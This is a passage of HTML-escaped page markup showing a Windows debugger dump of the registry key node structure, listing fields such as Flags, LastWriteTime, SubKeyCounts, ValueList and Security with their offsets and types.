 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x002&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Flags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;LastWriteTime&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_LARGE_INTEGER&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;AccessBits&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;UChar&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00d&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;LayerSemantics&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00d&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Spare1&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;2,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00d&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;InheritClass&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;7,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Bit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00e&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Spare2&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Parent&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x014&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SubKeyCounts&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[2]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x01c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;SubKeyLists&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[2]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x024&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ValueList&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CHILD_LIST&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Count&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x01c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;ChildHiveReference&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_CM_KEY_REFERENCE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;KeyCell&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;KeyHive&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Ptr64&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_HHIVE&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x02c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Security&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x030&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x034&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxNameLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x034&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;UserFlags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;16,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x034&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;VirtControlFlags&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;20,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x034&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Debug&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Pos&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;24,&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Bits&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x038&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxClassLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x03c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxValueNameLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x040&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;MaxValueDataLen&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x044&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;WorkVar&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x048&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;NameLength&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint2B&lt;/span&gt;&lt;/p&gt;
